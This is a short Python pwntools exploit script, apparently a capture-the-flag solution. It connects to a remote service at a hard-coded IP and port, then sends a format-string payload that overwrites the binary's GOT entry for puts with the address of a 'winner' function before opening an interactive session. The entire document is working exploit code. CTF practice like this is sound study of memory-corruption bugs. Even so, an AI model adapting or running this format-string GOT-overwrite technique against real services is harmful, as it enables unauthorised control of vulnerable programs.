from pwn import *
# p = process("./overwrite")
p = remote("3.101.12.127",5007)
elf = context.binary = ELF("./overwrite")
payload = fmtstr_payload(6,{elf.got.puts:elf.sym.winner})

p.recvline()
p.sendline(payload)
p.interactive()